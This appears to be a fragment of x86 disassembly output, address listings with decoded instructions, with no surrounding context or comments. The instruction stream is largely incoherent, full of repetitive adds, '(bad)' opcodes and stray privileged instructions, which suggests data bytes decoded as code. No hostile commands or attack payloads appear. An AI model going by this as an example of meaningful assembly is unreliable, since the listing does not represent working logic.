  402cc0:	push   es
  402cc1:	add    BYTE PTR [ebp+0x6020107],al
  402cc7:	add    BYTE PTR [edi+eax*1+0x60201],bl
  402cce:	mov    ecx,0x6020107
  402cd3:	add    bh,dl
  402cd5:	pop    es
  402cd6:	add    DWORD PTR [edx],eax
  402cd8:	push   es
  402cd9:	add    al,dh
  402cdb:	pop    es
  402cdc:	add    DWORD PTR [edx],eax
  402cde:	push   es
  402cdf:	add    BYTE PTR [ecx],cl
  402ce1:	or     BYTE PTR [ecx],al
  402ce3:	add    al,BYTE PTR [esi]
  402ce5:	add    BYTE PTR [eax+ecx*1],ah
  402ce8:	add    DWORD PTR [edx],eax
  402cea:	push   es
  402ceb:	add    BYTE PTR ds:0x6020108,bh
  402cf1:	add    BYTE PTR [edx+0x8],bl
  402cf4:	add    DWORD PTR [edx],eax
  402cf6:	push   es
  402cf7:	add    BYTE PTR [ecx+0x6088008],dl
  402cfd:	add    BYTE PTR [ebx+0x6088008],dh
  402d03:	add    ch,dl
  402d05:	or     BYTE PTR [ecx],al
  402d07:	add    al,BYTE PTR [esi]
  402d09:	add    al,dh
  402d0b:	or     BYTE PTR [ecx],al
  402d0d:	add    al,BYTE PTR [esi]
  402d0f:	add    BYTE PTR [ecx],cl
  402d11:	or     DWORD PTR [ecx],eax
  402d13:	add    al,BYTE PTR [esi]
  402d15:	add    BYTE PTR [edi+0x9],al
  402d18:	daa    
  402d19:	or     DWORD PTR [esi],eax
  402d1b:	add    BYTE PTR [eax+0x9],bh
  402d1e:	or     DWORD PTR gs:[edi+0x98c00],ecx
  402d25:	add    BYTE PTR [esi],al
  402d27:	add    BYTE PTR [ebx+0x6092709],bl
  402d2d:	add    bh,bl
  402d2f:	or     ecx,esp
  402d31:	add    BYTE PTR [esi],al
  402d33:	add    ch,dh
  402d35:	or     ecx,esp
  402d37:	add    BYTE PTR [esi],al
  402d39:	add    BYTE PTR [esi],ch
  402d3b:	or     ah,cl
  402d3d:	add    BYTE PTR [esi],al
  402d3f:	add    BYTE PTR ds:0x600e10a,dh
  402d45:	add    BYTE PTR [edx+ecx*1],bh
  402d48:	add    DWORD PTR [edx],eax
  402d4a:	push   es
  402d4b:	add    BYTE PTR [eax+0xa],bh
  402d4e:	arpl   WORD PTR [edx],cx
  402d50:	push   es
  402d51:	add    BYTE PTR [ecx+0x1f00e10a],bl
  402d57:	add    BYTE PTR [esi+0x600000a],bh
  402d5d:	add    ah,ch
  402d5f:	or     ah,cl
  402d61:	add    BYTE PTR [esi],al
  402d63:	add    BYTE PTR [eax],al
  402d65:	or     esp,ecx
  402d67:	add    BYTE PTR [esi],al
  402d69:	add    BYTE PTR [edx],cl
  402d6b:	or     esp,ecx
  402d6d:	add    BYTE PTR [esi],al
  402d6f:	add    BYTE PTR [ebx+ecx*1],bh
  402d72:	loope  0x402d74
  402d74:	or     al,BYTE PTR [eax]
  402d76:	push   esp
  402d77:	or     esi,edi
  402d79:	add    BYTE PTR [esi],al
  402d7b:	add    BYTE PTR [edi+0x601560b],al
  402d81:	add    BYTE PTR [ebp+0x600e10b],dl
  402d87:	add    ah,ah
  402d89:	or     edx,DWORD PTR [esi+0x1]
  402d8c:	push   es
  402d8d:	add    dl,dh
  402d8f:	or     edx,DWORD PTR [esi+0x1]
  402d92:	push   es
  402d93:	add    dl,bh
  402d95:	or     eax,DWORD PTR [ecx]
  402d97:	add    al,BYTE PTR [esi]
  402d99:	add    BYTE PTR [esi],ah
  402d9b:	or     al,0x56
  402d9d:	add    DWORD PTR [esi],eax
  402d9f:	add    BYTE PTR [esp+ecx*1],dh
  402da2:	push   esi
  402da3:	add    DWORD PTR [esi],eax
  402da5:	add    BYTE PTR [esp+ecx*1+0x1],ah
  402da9:	add    al,BYTE PTR [esi]
  402dab:	add    BYTE PTR [ebx+0x602010c],ah
  402db1:	add    ah,ch
  402db3:	or     al,0xd9
  402db5:	or     al,0x6
  402db7:	add    bh,bh
  402db9:	or     al,0x1
  402dbb:	add    al,BYTE PTR [esi]
  402dbd:	add    BYTE PTR [ecx],bl
  402dbf:	or     eax,0x60927
  402dc4:	jb     0x402dd3
  402dc6:	loope  0x402dc8
  402dc8:	push   es
  402dc9:	add    BYTE PTR [ebx+0xa00e10d],ah
  402dcf:	add    BYTE PTR [esi+0xa01240d],ch
  402dd5:	add    bl,ah
  402dd7:	or     eax,0x60124
  402ddc:	sub    al,0xe
  402dde:	daa    
  402ddf:	or     DWORD PTR [esi],eax
  402de1:	add    BYTE PTR [edi+0xe],al
  402de4:	loope  0x402de6
  402de6:	push   es
  402de7:	add    BYTE PTR [edx+0xe],ch
  402dea:	loope  0x402dec
  402dec:	adc    al,BYTE PTR [eax]
  402dee:	jns    0x402dfe
  402df0:	or     DWORD PTR gs:[esi],edx
  402df3:	add    bh,al
  402df5:	push   cs
  402df6:	xchg   edi,eax
  402df7:	push   cs
  402df8:	sbb    al,BYTE PTR [eax]
  402dfa:	jns    0x402e0a
  402dfc:	or     DWORD PTR gs:[esi],eax
  402dff:	add    al,dh
  402e01:	push   cs
  402e02:	fisttp WORD PTR [esi]
  402e04:	push   es
  402e05:	add    BYTE PTR [ebx],al
  402e07:	sgdtd  [edx]
  402e0a:	push   es
  402e0b:	add    BYTE PTR [ecx],bh
  402e0d:	comiss xmm1,DWORD PTR [edi]
  402e10:	push   es
  402e11:	add    BYTE PTR [edx+0xf],al
  402e14:	das    
  402e15:	clts   
  402e17:	add    BYTE PTR [edi+0xf],ah
  402e1a:	das    
  402e1b:	clts   
  402e1d:	add    BYTE PTR [esi+0x60f2f0f],ah
  402e23:	add    al,ah
  402e25:	pandn  mm1,QWORD PTR [esi]
  402e28:	push   ds
  402e29:	add    BYTE PTR [ebx+0x10],dl
  402e2c:	and    dl,BYTE PTR [eax]
  402e2e:	or     al,BYTE PTR [eax]
  402e30:	ins    DWORD PTR es:[edi],dx
  402e31:	adc    BYTE PTR [esi+eax*1],bl
  402e34:	add    BYTE PTR [eax],al
  402e36:	add    BYTE PTR [eax],al
  402e38:	add    DWORD PTR [eax],eax
  402e3a:	add    BYTE PTR [eax],al
  402e3c:	add    BYTE PTR [eax],al
  402e3e:	add    DWORD PTR [eax],eax
  402e40:	add    DWORD PTR [eax],eax
  402e42:	add    DWORD PTR [eax],eax
  402e44:	adc    BYTE PTR [eax],al
  402e46:	xor    al,BYTE PTR [eax]
  402e48:	dec    edx
  402e49:	add    BYTE PTR ds:0x1000100,al
  402e4f:	add    BYTE PTR [eax],al
  402e51:	add    BYTE PTR [eax],dl
  402e53:	add    BYTE PTR [eax+0x5004a00],cl
  402e59:	add    BYTE PTR [eax+eax*1],al
  402e5c:	or     BYTE PTR [eax],al
  402e5e:	add    BYTE PTR [eax],al
  402e60:	adc    BYTE PTR [eax],al
  402e62:	mov    ds:0xc004a00,al
  402e67:	add    BYTE PTR [esi],al
  402e69:	add    BYTE PTR ds:0x10000000,bl
  402e6f:	add    BYTE PTR [esi+0x5004a00],dh
  402e75:	add    BYTE PTR [esi],cl
  402e77:	add    BYTE PTR [esi],ch
  402e79:	add    BYTE PTR [ecx],al
  402e7b:	add    BYTE PTR [eax],dl
  402e7d:	add    al,cl
  402e7f:	add    BYTE PTR [edx+0x0],cl
  402e82:	add    eax,0x37001200
  402e87:	add    BYTE PTR [ecx],al
  402e89:	add    BYTE PTR [eax],dl
  402e8b:	add    ah,dl
  402e8d:	add    BYTE PTR [edx+0x0],cl
  402e90:	adc    DWORD PTR [eax],eax
  402e92:	adc    eax,DWORD PTR [eax]
  402e94:	cmp    al,BYTE PTR [eax]
  402e96:	add    DWORD PTR [eax],eax
  402e98:	jle    0x402e9b
  402e9a:	or     al,BYTE PTR [eax]
  402e9c:	add    DWORD PTR [eax],eax
  402e9e:	mov    WORD PTR [ecx],es
  402ea0:	adc    eax,DWORD PTR [eax]
  402ea2:	add    DWORD PTR [eax],eax
  402ea4:	mov    dl,0x1
  402ea6:	sbb    al,0x0
  402ea8:	add    DWORD PTR [eax],eax
  402eaa:	inc    edi
  402eab:	add    cl,BYTE PTR [ecx+0x0]
  402eae:	add    DWORD PTR [eax],eax
  402eb0:	push   eax
  402eb1:	add    cl,BYTE PTR [eax+eax*1+0x1]
  402eb5:	add    BYTE PTR [eax],ah
  402eb7:	add    al,0xa5
  402eb9:	add    BYTE PTR [ecx],al
  402ebb:	add    BYTE PTR [ecx],ch
  402ebd:	add    al,0xa9
  402ebf:	add    BYTE PTR [ecx],al
  402ec1:	add    BYTE PTR [edx],dh
  402ec3:	add    al,0x49
  402ec5:	add    BYTE PTR [ecx],al
  402ec7:	add    BYTE PTR [esi+0x4],al
  402eca:	dec    ecx
  402ecb:	add    BYTE PTR [ecx],al
  402ecd:	add    BYTE PTR [ebx+0x4],dl
  402ed0:	dec    ecx
  402ed1:	add    BYTE PTR [ecx],al
  402ed3:	add    BYTE PTR [edi+0x4],ch
  402ed6:	lods   eax,DWORD PTR ds:[esi]
  402ed7:	add    BYTE PTR [ecx],al
  402ed9:	add    BYTE PTR [esi+0x100b104],al
  402edf:	add    BYTE PTR [edx+0x100b104],bl
  402ee5:	add    BYTE PTR [eax],ah
  402ee7:	add    al,0xa5
  402ee9:	add    BYTE PTR [ecx],al
  402eeb:	add    ah,bl
  402eed:	add    al,0x49
  402eef:	add    BYTE PTR [ecx],al
  402ef1:	add    cl,ah
  402ef3:	add    al,0x4c
  402ef5:	add    BYTE PTR [ecx],al
  402ef7:	add    bl,dh
  402ef9:	add    al,0xc8
  402efb:	add    BYTE PTR [ecx],dl
  402efd:	add    BYTE PTR ds:0x103a90e,al
  402f03:	add    BYTE PTR [eax+0x1100a505],ah
  402f09:	add    BYTE PTR [edx+0x11001c01],dh
  402f0f:	add    BYTE PTR [ecx+0x11001c05],dh
  402f15:	add    dh,al
  402f17:	add    eax,0x11001c
  402f1c:	add    eax,0x5004260e
  402f21:	and    DWORD PTR [eax],eax
  402f23:	add    BYTE PTR [eax],al
  402f25:	add    BYTE PTR [esi+0x2301c118],al
  402f2b:	add    BYTE PTR [ecx],al
  402f2d:	add    BYTE PTR [ecx+eiz*1+0x0],al
  402f34:	xchg   BYTE PTR [eax],al
  402f36:	mov    DWORD PTR [ecx],0x2002c
  402f3c:	enter  0x21,0x0
  402f40:	add    BYTE PTR [eax],al
  402f42:	xchg   BYTE PTR [eax],al
  402f44:	loop   0x402f47
  402f46:	xor    al,BYTE PTR [eax]
  402f48:	add    eax,DWORD PTR [eax]
  402f4a:	or     al,0x22
  402f4c:	add    BYTE PTR [eax],al
  402f4e:	add    BYTE PTR [eax],al
  402f50:	add    DWORD PTR [eax],0x2c01f2
  402f56:	add    eax,0x227400
  402f5b:	add    BYTE PTR [eax],al
  402f5d:	add    BYTE PTR [ecx+0x3a021c00],al
  402f63:	add    BYTE PTR [esi],al
  402f65:	add    BYTE PTR [ebx+eiz*1+0x0],cl
  402f69:	add    BYTE PTR [eax],al
  402f6b:	add    BYTE PTR [ecx+0x32022900],al
  402f71:	add    BYTE PTR [ecx],cl
  402f73:	add    BYTE PTR [ebx+eiz*1+0x0],ch
  402f77:	add    BYTE PTR [eax],al
  402f79:	add    BYTE PTR [ecx+0x43023a00],al
  402f7f:	add    BYTE PTR [ebx],cl
  402f81:	add    BYTE PTR [edx+0x23],ch
  402f87:	add    BYTE PTR [esi+0x5001c118],al
  402f8d:	add    BYTE PTR [eax+eax*1],cl
  402f90:	shl    BYTE PTR [ebx],0x0
  402f93:	add    BYTE PTR [eax],al
  402f95:	add    dh,al
  402f97:	or     DWORD PTR [edi+0x2],ebx
  402f9a:	push   edi
  402f9b:	add    BYTE PTR [esi],cl
  402f9d:	add    bl,al
  402f9f:	and    eax,DWORD PTR [eax]
  402fa1:	add    BYTE PTR [eax],al
  402fa3:	add    dh,ah
  402fa5:	or     DWORD PTR [eax+0x2],esi
  402fa8:	pop    ebx
  402fa9:	add    BYTE PTR [esi],cl
  402fab:	add    ah,cl
  402fad:	and    eax,DWORD PTR [eax]
  402faf:	add    BYTE PTR [eax],al
  402fb1:	add    BYTE PTR [esi+0x5b027d08],al
  402fb7:	add    BYTE PTR [esi],cl
  402fb9:	add    BYTE PTR [eax],al
  402fbb:	and    al,0x0
  402fbd:	add    BYTE PTR [eax],al
  402fbf:	add    dh,ah
  402fc1:	or     DWORD PTR [esi+0xe005f02],eax
  402fc7:	add    BYTE PTR [eax],cl
  402fc9:	and    al,0x0
  402fcb:	add    BYTE PTR [eax],al
  402fcd:	add    dh,al
  402fcf:	or     DWORD PTR [ecx+0xe006402],ebx
  402fd5:	add    BYTE PTR [ebx],cl
  402fd7:	and    al,0x0
  402fd9:	add    BYTE PTR [eax],al
  402fdb:	add    dh,al
  402fdd:	or     DWORD PTR [esi+0xe006902],esp
  402fe3:	add    BYTE PTR [edx],dl
  402fe5:	and    al,0x0
  402fe7:	add    BYTE PTR [eax],al
  402fe9:	add    dh,al
  402feb:	add    DWORD PTR [edx+0xe006e02],edi
  402ff1:	add    BYTE PTR [ecx],bl
  402ff3:	and    al,0x0
  402ff5:	add    BYTE PTR [eax],al
  402ff7:	add    dh,al
  402ff9:	or     esp,eax
  402ffb:	add    dl,BYTE PTR [edi+0x0]
  402ffe:	verr   WORD PTR [eax]
  403001:	and    al,0x0
  403003:	add    BYTE PTR [eax],al
  403005:	add    dh,al
  403007:	or     eax,edx
  403009:	add    dl,BYTE PTR [edi+0x0]
  40300c:	verr   WORD PTR [edi]
  40300f:	and    al,0x0
  403011:	add    BYTE PTR [eax],al
  403013:	add    dh,al
  403015:	or     ecx,esp
  403017:	add    dl,BYTE PTR [edi+0x0]
  40301a:	verw   WORD PTR [esi]
  40301d:	and    al,0x0
  40301f:	add    BYTE PTR [eax],al
  403021:	add    dh,al
  403023:	or     ebp,esi
  403025:	add    dl,BYTE PTR [edi+0x0]
  403028:	(bad)  
  40302a:	xor    eax,0x24
  40302f:	add    dh,al
  403031:	or     DWORD PTR [esi],eax
  403033:	add    edx,DWORD PTR [edi+0x0]
  403036:	(bad)  
  403038:	cmp    al,0x24
  40303a:	add    BYTE PTR [eax],al
  40303c:	add    BYTE PTR [eax],al
  40303e:	(bad)  
  40303f:	or     DWORD PTR [ebx+eax*1],ebx
  403042:	add    BYTE PTR fs:[edi],cl
  403045:	add    BYTE PTR [ebx+0x24],al
  403048:	add    BYTE PTR [eax],al
  40304a:	add    BYTE PTR [eax],al
  40304c:	(bad)  
  40304d:	or     DWORD PTR [ecx],ebp
  40304f:	add    esp,DWORD PTR [eax+eax*1+0xf]
  403053:	add    BYTE PTR [edx+0x24],cl
  403056:	add    BYTE PTR [eax],al
  403058:	add    BYTE PTR [eax],al
  40305a:	mov    BYTE PTR [ecx],0x35
  40305d:	add    esi,DWORD PTR [eax+eax*1+0xf]
  403061:	add    BYTE PTR [ecx+0x24],dl
  403064:	add    BYTE PTR [eax],al
  403066:	add    BYTE PTR [eax],al
  403068:	mov    BYTE PTR [ecx],0x46
  40306b:	add    edi,DWORD PTR [eax+0x0]
  40306e:	ltr    WORD PTR [eax+0x24]
  403072:	add    BYTE PTR [eax],al
  403074:	add    BYTE PTR [eax],al
  403076:	mov    BYTE PTR [ecx],0x4f
  403079:	add    edi,DWORD PTR [edi+0x0]
  40307c:	adc    al,BYTE PTR [eax]
  40307e:	pop    edi
  40307f:	and    al,0x0
  403081:	add    BYTE PTR [eax],al
  403083:	add    dh,al
  403085:	add    DWORD PTR [ebx+0x3],ebx
  403088:	test   DWORD PTR [eax],eax
  40308a:	adc    al,0x0
  40308c:	data16 and al,0x0
  40308f:	add    BYTE PTR [eax],al
  403091:	add    dh,ah
  403093:	add    DWORD PTR [edx+0x3],ebp
  403096:	mov    DWORD PTR [eax],eax
  403098:	adc    al,0x0
  40309a:	ins    DWORD PTR es:[edi],dx
  40309b:	and    al,0x0
  40309d:	add    BYTE PTR [eax],al
  40309f:	add    dh,ah
  4030a1:	or     DWORD PTR [ebx+0x3],edi
  4030a4:	push   edi
  4030a5:	add    BYTE PTR ds:0x247400,dl
  4030ab:	add    BYTE PTR [eax],al
  4030ad:	add    BYTE PTR [esi-0x4afe3ee8],al
  4030b3:	add    BYTE PTR ds:0x255c00,dl
  4030b9:	add    BYTE PTR [eax],al
  4030bb:	add    BYTE PTR [ecx-0x3ffb4700],al
  4030c1:	add    BYTE PTR [ecx],bl
  4030c3:	add    BYTE PTR [esi+eiz*1],dh
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	add    BYTE PTR [eax],al
  4030ca:	(bad)  
  4030cb:	or     BYTE PTR [edi+0x2],bl
  4030ce:	push   edi
  4030cf:	add    BYTE PTR [ebx],bl
  4030d1:	add    BYTE PTR [edi],dh
  4030d3:	add    BYTE PTR es:[eax],al
  4030d6:	add    BYTE PTR [eax],al
  4030d8:	(bad)  
  4030d9:	or     BYTE PTR [ecx+0x1b006402],bl
  4030df:	add    BYTE PTR [edi],bh
  4030e1:	add    BYTE PTR es:[eax],al
  4030e4:	add    BYTE PTR [eax],al
  4030e6:	(bad)  
  4030e7:	or     BYTE PTR [esi+0x1b006902],ah
  4030ed:	add    BYTE PTR [eax+0x26],bl
  4030f0:	add    BYTE PTR [eax],al
  4030f2:	add    BYTE PTR [eax],al
  4030f4:	(bad)  
  4030f5:	or     ah,al
  4030f7:	add    dl,BYTE PTR [edi+0x0]
  4030fa:	sbb    eax,DWORD PTR [eax]
  4030fc:	gs add BYTE PTR es:[eax],al
  403100:	add    BYTE PTR [eax],al
  403102:	(bad)  
  403103:	or     BYTE PTR [esi],al
  403105:	add    edx,DWORD PTR [edi+0x0]
  403108:	sbb    eax,DWORD PTR [eax]
  40310a:	push   0x26
  40310f:	add    dh,al
  403111:	or     al,dl
  403113:	add    dl,BYTE PTR [edi+0x0]
  403116:	sbb    eax,DWORD PTR [eax]
  403118:	jbe    0x403140
  40311a:	add    BYTE PTR [eax],al
  40311c:	add    BYTE PTR [eax],al
  40311e:	(bad)  
  40311f:	or     cl,ah
  403121:	add    dl,BYTE PTR [edi+0x0]
  403124:	sbb    eax,DWORD PTR [eax]
  403126:	test   BYTE PTR [esi],ah
  403128:	add    BYTE PTR [eax],al
  40312a:	add    BYTE PTR [eax],al
  40312c:	(bad)  
  40312d:	or     ch,dh
  40312f:	add    dl,BYTE PTR [edi+0x0]
  403132:	sbb    eax,DWORD PTR [eax]
  403134:	xchg   edx,eax
  403135:	add    BYTE PTR es:[eax],al
  403138:	add    BYTE PTR [eax],al
  40313a:	(bad)  
  40313b:	or     BYTE PTR [ecx],ch
  40313d:	add    esp,DWORD PTR [eax+eax*1+0x1b]
  403141:	add    BYTE PTR [ebp+0x26],ah
  403147:	add    dh,al
  403149:	or     BYTE PTR [ebx+eax*1],bl
  40314c:	add    BYTE PTR fs:[ebx],bl
  40314f:	add    BYTE PTR [eax+0x26],bh
  403155:	add    dh,al
  403157:	add    BYTE PTR [edx+0x1b006e02],bh
  40315d:	add    cl,bl
  40315f:	add    BYTE PTR es:[eax],al
  403162:	add    BYTE PTR [eax],al
  403164:	mov    BYTE PTR [eax],0x35
  403167:	add    esi,DWORD PTR [eax+eax*1+0x1c]
  40316b:	add    ah,ch
  40316d:	add    BYTE PTR es:[eax],al
  403170:	add    BYTE PTR [eax],al
  403172:	mov    BYTE PTR [eax],0x46
  403175:	add    edi,DWORD PTR [eax+0x0]
  403178:	sbb    al,0x0
  40317a:	sbb    BYTE PTR [edi],ah
  40317c:	add    BYTE PTR [eax],al
  40317e:	add    BYTE PTR [eax],al
  403180:	mov    BYTE PTR [eax],0x4f
  403183:	add    edi,DWORD PTR [edi+0x0]
  403186:	pop    ds
  403187:	add    BYTE PTR [esi],bh
  403189:	daa    
  40318a:	add    BYTE PTR [eax],al
  40318c:	add    BYTE PTR [eax],al
  40318e:	mov    BYTE PTR [eax],0x5b
  403191:	add    eax,DWORD PTR [ebp+0x50002100]
  403197:	daa    
  403198:	add    BYTE PTR [eax],al
  40319a:	add    BYTE PTR [eax],al
  40319c:	xchg   BYTE PTR [eax],bl
  40319e:	rol    DWORD PTR [ecx],0xcc
  4031a1:	add    BYTE PTR [ecx],ah
  4031a3:	add    BYTE PTR [edi+eiz*1+0x0],al
  4031aa:	out    0x9,al
  4031ac:	jge    0x4031b0
  4031ae:	pop    ebx
  4031af:	add    BYTE PTR [eax+eax*1],ah
  4031b2:	mov    WORD PTR [edi],fs
  4031b4:	add    BYTE PTR [eax],al
  4031b6:	add    BYTE PTR [eax],al
  4031b8:	out    0x9,al
  4031ba:	add    BYTE PTR ds:0x240064,al
  4031c0:	mov    ecx,0x27
  4031c5:	add    dh,ah
  4031c7:	or     DWORD PTR [ecx],ecx
  4031c9:	add    eax,0x240064
  4031ce:	lds    esp,FWORD PTR [edi]
  4031d0:	add    BYTE PTR [eax],al
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	out    0x9,al
  4031d6:	sbb    BYTE PTR ds:0x240057,al
  4031dc:	enter  0x27,0x0
  4031e0:	add    BYTE PTR [eax],al
  4031e2:	out    0x9,al
  4031e4:	sub    DWORD PTR ds:0x240057,eax
  4031ea:	retf   
  4031eb:	daa    
  4031ec:	add    BYTE PTR [eax],al
  4031ee:	add    BYTE PTR [eax],al
  4031f0:	out    0x9,al
  4031f2:	inc    edx
  4031f3:	add    eax,0x240057
  4031f8:	jmp    0xe600:0x27
  4031ff:	add    DWORD PTR [ecx+0x5],edx
  403202:	aad    0x0
  403204:	and    al,0x0
  403206:	and    BYTE PTR [eax],ch
  403208:	add    BYTE PTR [eax],al
  40320a:	add    BYTE PTR [eax],al
  40320c:	out    0x1,al
  40320e:	pop    edx
  40320f:	add    eax,0x25007f
  403214:	nop
  403215:	sub    BYTE PTR [eax],al
  403217:	add    BYTE PTR [eax],al
  403219:	add    BYTE PTR [esi-0x25fa6500],dl
  40321f:	add    BYTE PTR [edi],ah
  403221:	add    BYTE PTR [edx],dh
  403223:	sub    DWORD PTR [eax],eax
  403225:	add    BYTE PTR [eax],al
  403227:	add    BYTE PTR [esi-0x7afe3ee8],al
  40322d:	add    BYTE PTR [eax],ch
  40322f:	add    BYTE PTR [esi+0x28],al
  403235:	add    BYTE PTR [ecx-0x5df22a00],dl
  40323b:	add    ebp,DWORD PTR [eax]
  40323d:	add    BYTE PTR [ecx+ebp*1],bh
  403240:	add    BYTE PTR [eax],al
  403242:	add    BYTE PTR [eax],al
  403244:	add    DWORD PTR [eax],0x8505d9
  40324a:	sub    DWORD PTR [eax],eax
  40324c:	aam    0x29
  40324e:	add    BYTE PTR [eax],al
  403250:	add    BYTE PTR [eax],al
  403252:	out    0x1,al
  403254:	in     al,dx
  403255:	add    eax,0x29002c
  40325a:	daa    
  40325b:	sub    al,BYTE PTR [eax]
  40325d:	add    BYTE PTR [eax],al
  40325f:	add    dh,ah
  403261:	add    DWORD PTR [eax],ecx
  403263:	push   es
  403264:	loopne 0x403266
  403266:	sub    al,BYTE PTR [eax]
  403268:	mov    WORD PTR [edx],gs
  40326a:	add    BYTE PTR [eax],al
  40326c:	add    BYTE PTR [eax],al
  40326e:	les    eax,FWORD PTR [eax]
  403270:	pop    ecx
  403271:	push   es
  403272:	out    0x0,al
  403274:	sub    al,BYTE PTR [eax]
  403276:	retf   
  403277:	sub    al,BYTE PTR [eax]
  403279:	add    BYTE PTR [eax],al
  40327b:	add    dh,ah
  40327d:	add    esp,ebp
  40327f:	add    eax,0x2b00ec
  403284:	imul   ebp,DWORD PTR [ebx],0x0
  403287:	add    BYTE PTR [eax],al
  403289:	add    BYTE PTR [esi-0x7afe3ee8],al
  40328f:	add    BYTE PTR [eax+eax*1],ch
  403292:	xor    BYTE PTR [edx],ch
  403294:	add    BYTE PTR [eax],al
  403296:	add    BYTE PTR [eax],al
  403298:	xchg   ecx,eax
  403299:	add    bh,cl
  40329b:	mov    cr0,esp
  40329e:	sub    al,0x0
  4032a0:	fsubr  QWORD PTR [edx]
  4032a2:	add    BYTE PTR [eax],al
  4032a4:	add    BYTE PTR [eax],al
  4032a6:	xchg   ecx,eax
  4032a7:	sbb    BYTE PTR [ebp+0x2c042210],al
  4032ad:	add    BYTE PTR [eax],al
  4032af:	add    BYTE PTR [ecx],al
  4032b1:	add    BYTE PTR [edx+0x1000001],dh
  4032b7:	add    BYTE PTR [esi+eax*1+0x0],ah
  4032bb:	add    BYTE PTR [ecx],al
  4032bd:	add    cl,ah
  4032bf:	add    al,0x0
  4032c1:	add    BYTE PTR [edx],al
  4032c3:	add    BYTE PTR [ecx+0x6],dh
  4032c6:	add    BYTE PTR [eax],al
  4032c8:	add    DWORD PTR [eax],eax
  4032ca:	fs push es
  4032cc:	add    BYTE PTR [eax],al
  4032ce:	add    DWORD PTR [eax],eax
  4032d0:	jl     0x4032d8
  4032d2:	add    BYTE PTR [eax],al
  4032d4:	add    al,BYTE PTR [eax]
  4032d6:	test   DWORD PTR [esi],eax
  4032d8:	add    BYTE PTR [eax],al
  4032da:	add    eax,DWORD PTR [eax]
  4032dc:	mov    es,WORD PTR [esi]
  4032de:	add    BYTE PTR [eax],al
  4032e0:	add    DWORD PTR [eax],eax
  4032e2:	loope  0x4032e8
  4032e4:	add    BYTE PTR [eax],al
  4032e6:	add    al,BYTE PTR [eax]
  4032e8:	pushf  
  4032e9:	push   es
  4032ea:	add    BYTE PTR [eax],al
  4032ec:	add    DWORD PTR [eax],eax
  4032ee:	stos   DWORD PTR es:[edi],eax
  4032ef:	push   es
  4032f0:	add    BYTE PTR [eax],al
  4032f2:	add    DWORD PTR [eax],eax
  4032f4:	inc    edi
  4032f5:	add    al,BYTE PTR [eax]
  4032f7:	add    BYTE PTR [edx],al
  4032f9:	add    BYTE PTR [eax+0x2],dl
  4032fc:	add    BYTE PTR [eax],al
  4032fe:	add    DWORD PTR [eax],eax
  403300:	fadd   QWORD PTR [eax+eax*1]
  403303:	add    BYTE PTR [ecx],al
  403305:	add    BYTE PTR [eax+0x2000006],bh
  40330b:	add    cl,al
  40330d:	push   es
  40330e:	add    BYTE PTR [eax],al
  403310:	add    eax,DWORD PTR [eax]
  403312:	lds    eax,FWORD PTR [esi]
  403314:	add    BYTE PTR [eax],al
  403316:	add    DWORD PTR [eax],eax
  403318:	mov    eax,0x2000006
  40331d:	add    ch,al
  40331f:	push   es
  403320:	add    BYTE PTR [eax],al
  403322:	add    DWORD PTR [eax],eax
  403324:	retf   0x6
  403327:	add    BYTE PTR [ecx],al
  403329:	add    BYTE PTR [eax],ah
  40332b:	add    al,0x0
  40332d:	add    BYTE PTR [edx],al
  40332f:	add    BYTE PTR [edi+0x2],al
  403332:	add    BYTE PTR [eax],al
  403334:	add    eax,DWORD PTR [eax]
  403336:	rol    BYTE PTR [esi],1
  403338:	add    BYTE PTR [eax],al
  40333a:	add    al,0x0
  40333c:	sub    DWORD PTR [eax+eax*1],eax
  40333f:	add    BYTE PTR [ecx],al
  403341:	add    cl,bl
  403343:	push   es
  403344:	add    BYTE PTR [eax],al
  403346:	add    al,BYTE PTR [eax]
  403348:	in     al,0x6
  40334a:	add    BYTE PTR [eax],al
  40334c:	add    DWORD PTR [eax],eax
  40334e:	fadd   QWORD PTR [eax+eax*1]
  403351:	add    BYTE PTR [ecx],al
  403353:	add    BYTE PTR [eax+0x2000006],bh
  403359:	add    cl,al
  40335b:	push   es
  40335c:	add    BYTE PTR [eax],al
  40335e:	add    eax,DWORD PTR [eax]
  403360:	lds    eax,FWORD PTR [esi]
  403362:	add    BYTE PTR [eax],al
  403364:	add    DWORD PTR [eax],eax
  403366:	mov    eax,0x2000006
  40336b:	add    ch,al
  40336d:	push   es
  40336e:	add    BYTE PTR [eax],al
  403370:	add    DWORD PTR [eax],eax
  403372:	and    BYTE PTR [eax+eax*1],al
  403375:	add    BYTE PTR [edx],al
  403377:	add    ah,bl
  403379:	add    al,0x0
  40337b:	add    BYTE PTR [ebx],al
  40337d:	add    cl,ah
  40337f:	add    al,0x0
  403381:	add    BYTE PTR [ecx],al
  403383:	add    BYTE PTR [eax+0x1000006],bh
  403389:	add    BYTE PTR [eax+0x2000006],bh
  40338f:	add    dl,cl
  403391:	push   es
  403392:	add    BYTE PTR [eax],al
  403394:	add    DWORD PTR [eax],eax
  403396:	repz push es
  403398:	add    BYTE PTR [eax],al
  40339a:	add    DWORD PTR [eax],eax
  40339c:	loope  0x4033ab
  40339e:	add    BYTE PTR [eax],al
  4033a0:	add    DWORD PTR [eax],eax
  4033a2:	clc    
  4033a3:	push   es
  4033a4:	add    BYTE PTR [eax],al
  4033a6:	add    DWORD PTR [eax],eax
  4033a8:	repz push es
  4033aa:	add    BYTE PTR [eax],al
  4033ac:	add    DWORD PTR [eax],eax
  4033ae:	loope  0x4033b4
  4033b0:	add    eax,DWORD PTR [eax]
  4033b2:	or     DWORD PTR [eax],eax
  4033b4:	add    eax,0x7000d00
  4033b9:	add    BYTE PTR ds:0xc1008900,dl
  4033bf:	add    ebx,esi
  4033c1:	add    BYTE PTR [ecx-0x7fe3f00],dl
  4033c7:	add    BYTE PTR [ecx-0x7fe3f00],bl
  4033cd:	add    BYTE PTR [ecx-0xcfe3f00],ah
  4033d3:	add    BYTE PTR [ecx-0xcfe3f00],ch
  4033d9:	add    BYTE PTR [ecx-0xcfe3f00],dh
  4033df:	add    BYTE PTR [ecx-0xcfe3f00],bh
  4033e5:	add    cl,al
  4033e7:	add    cl,al
  4033e9:	add    ebx,esi
  4033eb:	add    cl,cl
  4033ed:	add    cl,al
  4033ef:	add    ebx,esi
  4033f1:	add    cl,dl
  4033f3:	add    cl,al
  4033f5:	add    ebx,esi
  4033f7:	add    cl,bl
  4033f9:	add    cl,al
  4033fb:	add    ebx,esi
  4033fd:	add    cl,ah
  4033ff:	add    cl,al
  403401:	add    ebx,esi
  403403:	add    cl,ch
  403405:	add    cl,al
